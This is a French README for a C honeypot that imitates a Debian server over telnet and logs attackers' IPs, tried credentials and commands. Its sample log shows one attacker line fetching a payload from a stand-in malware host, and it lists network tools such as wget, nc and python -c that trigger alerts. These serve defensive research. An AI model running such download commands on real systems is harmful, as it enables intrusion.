#  Honeypot High-Interaction — C

## Présentation

Ce projet est un **Honeypot (pot de miel) de haute interaction** développé entièrement en langage **C**. Il simule un serveur **Debian GNU/Linux 11 (bullseye)** vulnérable pour attirer les attaquants, enregistrer leurs adresses IP, capturer leurs identifiants de connexion et l'intégralité des commandes saisies dans un système de fichiers virtuel réaliste.

Contrairement à un simple écouteur de port, il implémente une **structure d'arborescence dynamique** permettant une navigation complète et réaliste, avec résolution de chemins absolus/relatifs, gestion des permissions, et un moteur de commandes étendu.

> Projet en cours de développement — questions & retours : **@fiakx** sur Discord

---

## Fonctionnalités

- **Système de Fichiers Virtuel (arbre)** : Navigation réelle entre répertoires via une structure en arbre avec résolution de chemins absolus et relatifs (`/etc/../home`, `cd /var/log`, etc.).
- **Arborescence Debian réaliste** : `/bin`, `/sbin`, `/etc`, `/home`, `/root`, `/tmp`, `/var/log`, `/proc`, `/usr/bin` avec fichiers et contenus crédibles (`/etc/passwd`, `/etc/shadow`, `auth.log`, `sshd_config`, etc.).
- **Multi-Client** : Gestion de connexions simultanées via `fork()` avec handler `SIGCHLD` pour éviter les processus zombies.
- **Audit & Logging complet** : Enregistrement horodaté de l'IP source, du username tenté, du mot de passe tenté, et de chaque commande exécutée dans `honeypot_audit.log`. Alertes spéciales pour les actions critiques (`wget`, `nc`, `python -c`, `reboot`...).
- **Bannière et MOTD réalistes** : Simulation du login Debian complet avec last login, kernel info, MOTD.
- **Historique de session** : Chaque commande saisie est mémorisée et accessible via `history`.
- **Prompt dynamique** : Le prompt `root@debian:/chemin/courant#` reflète en temps réel le répertoire courant avec chemin absolu complet.

---

## Commandes Supportées

### Navigation & Système

| Commande | Description |
|----------|-------------|
| `ls [-la]` | Liste les fichiers. Supporte `-l` (format long avec permissions, taille, date) et `-a` (fichiers cachés). |
| `cd [chemin]` | Change de répertoire. Supporte `/`, `..`, `~`, chemins absolus et relatifs. |
| `pwd` | Affiche le chemin absolu complet du répertoire courant. |
| `whoami` | Affiche l'utilisateur courant (`root`). |
| `id` | Affiche `uid=0(root) gid=0(root) groups=0(root)`. |
| `uname [-a\|-r]` | Informations système. `-a` : version complète du kernel. |
| `hostname` | Affiche le nom de la machine (`debian`). |
| `uptime` | Affiche le temps de fonctionnement simulé. |
| `clear` | Efface le terminal (séquence ANSI). |
| `env` / `printenv` | Affiche les variables d'environnement de la session. |
| `history` | Affiche l'historique des commandes de la session courante. |

### Manipulation de Fichiers & Répertoires

| Commande | Description |
|----------|-------------|
| `cat [fichier...]` | Affiche le contenu d'un ou plusieurs fichiers. |
| `mkdir [dossier...]` | Crée un ou plusieurs répertoires. Détecte si le nom existe déjà. |
| `touch [fichier...]` | Crée un fichier vide ou met à jour son `mtime`. |
| `rm [-rf] [cible...]` | Supprime fichiers/dossiers. Supporte `-r` (récursif) et `-f` (force). |
| `cp [src] [dst]` | Copie un fichier vers une destination (répertoire ou nouveau nom). |
| `mv [src] [dst]` | Déplace ou renomme un fichier/répertoire. |
| `chmod [mode] [cible]` | Simule la modification des permissions (accepté silencieusement). |
| `echo [-n] [texte]` | Affiche du texte. Supporte `-n` (sans saut de ligne). |
| `grep [pattern] [fichier]` | Recherche un pattern dans un fichier ligne par ligne. |
| `find [chemin] [-name pattern]` | Recherche récursive de fichiers/dossiers avec DFS itératif. |

### Surveillance & Réseau

| Commande | Description |
|----------|-------------|
| `ps [aux]` | Affiche les processus simulés. |
| `df` | Affiche l'utilisation des disques (valeurs simulées réalistes). |
| `free` | Affiche l'utilisation mémoire/swap. |
| `ifconfig` / `ip` | Affiche la configuration réseau simulée (eth0 + lo). |
| `wget [url]` / `curl [url]` | Simule un téléchargement échoué. **Génère une alerte dans les logs.** |
| `ssh [host]` | Simule une connexion SSH refusée. **Alerte loggée.** |
| `nc` / `netcat` | Simule netcat. **Alerte loggée.** |
| `su` | Renvoie un échec d'authentification. |

### Commandes Dangereuses (loggées avec alerte)

| Commande | Comportement |
|----------|-------------|
| `python3 -c` / `perl` / `php` | Simule un `Segmentation fault`. Alerte loggée avec le code tenté. |
| `reboot` / `shutdown` / `halt` | Affiche un message de reboot, ferme la connexion. Alerte loggée. |
| `wget` / `curl` | Échec DNS simulé. URL loggée en alerte. |

---

## Arborescence du Système de Fichiers Virtuel

```
/
├── bin/          (bash, ls, cat, grep, find, chmod, cp, mv, rm, touch, mkdir, echo, ...)
├── sbin/         (ifconfig, iptables, service, reboot, shutdown)
├── etc/
│   ├── passwd    (utilisateurs root + daemon + www-data + user)
│   ├── shadow    (hashes bcrypt simulés)
│   ├── hostname
│   ├── os-release
│   ├── hosts
│   ├── cron.d/backup
│   └── ssh/sshd_config
├── home/user/
│   ├── .bash_history  (commandes suspectes pré-remplies)
│   └── .bashrc
├── root/
│   └── .bash_history
├── tmp/
├── proc/
│   ├── version
│   ├── cpuinfo   (Intel Xeon simulé)
│   └── meminfo
├── var/log/
│   ├── auth.log  (tentatives SSH simulées)
│   └── syslog
└── usr/
    ├── bin/      (wget, curl, python3, perl, gcc, git, ssh, nc, nmap, vim, ...)
    └── local/bin/backup.sh
```

---

## Format des Logs (`honeypot_audit.log`)

```
[Thu Feb 26 03:12:44 2026] [IP:192.168.1.42] ALERTE: NOUVELLE CONNEXION
[Thu Feb 26 03:12:44 2026] [IP:192.168.1.42] LOGIN TENTATIVE username: admin
[Thu Feb 26 03:12:45 2026] [IP:192.168.1.42] LOGIN TENTATIVE password: admin123
[Thu Feb 26 03:12:47 2026] [IP:192.168.1.42] CMD: cat /etc/passwd
[Thu Feb 26 03:12:50 2026] [IP:192.168.1.42] CMD: wget http://malware.example.com/payload
[Thu Feb 26 03:12:50 2026] [IP:192.168.1.42] ALERTE: DOWNLOAD TENTE: http://malware.example.com/payload
[Thu Feb 26 03:12:55 2026] [IP:192.168.1.42] DECONNEXION
```

---

## Installation & Compilation

### Prérequis

- Un compilateur C (`gcc`)
- Un environnement Linux/Unix
- `telnet` ou `nc` pour tester

### Compilation

```bash
gcc -Wall -Wextra -o honeypot honeypot.c
```

### Lancement

```bash
./honeypot
```

Le serveur écoute sur le port **2323** par défaut.

### Test

```bash
telnet 127.0.0.1 2323
# ou
nc 127.0.0.1 2323
```

---

## Sécurité & Bonnes Pratiques

>  Ce projet est un **outil de recherche et d'apprentissage**. Ne pas déployer en production sans précautions.

- **Isolation** : Ne jamais exécuter avec les droits `root` réels sur votre machine hôte.
- **VM / Conteneur** : Toujours déployer dans une machine virtuelle ou un conteneur Docker isolé pour éviter qu'un attaquant n'atteigne votre hôte physique via une éventuelle faille dans le code C.
- **Pare-feu** : Limiter l'accès au port 2323 à des IP de confiance si utilisé en environnement de lab.
- **Rotation des logs** : Mettre en place une rotation de `honeypot_audit.log` si le honeypot tourne longtemps (`logrotate`).

---

## Roadmap

- [ ] Support de la redirection (`>`, `>>`, `<`)
- [ ] Pipes multi-commandes (`cmd1 | cmd2 | cmd3`)
- [ ] `apt-get` / `dpkg` simulés
- [ ] `alias` et variables shell (`$VAR`)
- [ ] Export des logs en JSON pour intégration SIEM
- [ ] Timeout de session inactif

---

*Questions & retours : **@fiakx** sur Discord (j'espere que vous aimez j'y ai passé du temps)*
